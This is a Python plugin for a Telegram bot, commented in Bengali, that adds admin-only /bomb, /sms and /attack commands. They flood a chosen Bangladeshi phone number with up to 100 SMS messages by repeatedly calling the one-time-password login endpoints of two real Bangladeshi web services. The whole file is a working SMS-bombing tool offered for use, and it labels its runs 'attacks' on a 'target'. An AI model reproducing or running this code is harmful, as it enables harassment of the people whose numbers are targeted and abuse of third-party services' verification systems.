import requests
import time

def register(bot):
    # শুধুমাত্র আপনি (@mr_King1430) এটি ব্যবহার করতে পারবেন সিকিউরিটির জন্য
    ADMIN_USERNAME = "mr_King1430"

    @bot.message_handler(commands=['bomb', 'sms', 'attack'])
    def handle_bombing(message):
        user_name = message.from_user.username
        
        # অ্যাডমিন চেক
        if user_name != ADMIN_USERNAME:
            return bot.reply_to(message, "❐ এই ডেঞ্জারাস কমান্ডটি শুধু মাত্র বসের জন্য! ⚔️")

        # ফরম্যাট চেক: /bomb [number] [amount]
        args = message.text.split()
        if len(args) < 3:
            return bot.reply_to(message, "❐ 𝐅𝐨𝐫𝐦𝐚𝐭: /bomb 17xxxxxxxx 50\n(নম্বর এবং অ্যামাউন্ট দিন)")

        num = args[1]
        try:
            amount = int(args[2])
        except:
            return bot.reply_to(message, "❐ অ্যামাউন্ট সংখ্যায় দিন বাবু! 🥺")

        if amount > 100:
            return bot.reply_to(message, "❐ একবারে ১০০ এর বেশি এসএমএস পাঠানো যাবে না।")

        # জিরো থাকলে বাদ দেওয়া
        if num.startswith("0"):
            num = num[1:]

        wait_msg = bot.reply_to(message, f"🚀 𝐀𝐭𝐭𝐚𝐜𝐤 𝐒𝐭𝐚𝐫𝐭𝐞𝐝 𝐨𝐧 0{num}...\nধৈর্য ধরুন, এসএমএস যাচ্ছে। ✨")

        headers_common = {
            "user-agent": "Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }

        sent = 0
        try:
            while sent < amount:
                # API 1: Bioscope
                res1 = requests.get(f"https://www.bioscopelive.com/en/login/send-otp?phone=880{num}&operator=bd-otp", headers=headers_common)
                if res1.status_code == 200:
                    sent += 1
                
                if sent >= amount: break
                time.sleep(1)

                # API 2: Bikroy
                res2 = requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0{num}", headers=headers_common)
                if res2.status_code == 200:
                    sent += 1
                
                if sent >= amount: break
                time.sleep(1)

            bot.edit_message_text(
                f"✅ 𝐀𝐭𝐭𝐚𝐜𝐤 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞!\n━━━━━━━━━━━━━━\n❐ 𝐓𝐚𝐫𝐠𝐞𝐭: 0{num}\n❐ 𝐒𝐞𝐧𝐭: {sent} SMS\n🕊️💖 𝐒𝐲𝐬𝐭𝐞𝐦 𝐁𝐲: 𝐌𝐫.𝐊𝐢𝐧𝐠",
                message.chat.id,
                wait_msg.message_id
            )

        except Exception as e:
            bot.edit_message_text(f"⚠️ 𝐒𝐞𝐫𝐯𝐞𝐫 𝐄𝐫𝐫𝐨𝐫: {str(e)}", message.chat.id, wait_msg.message_id)
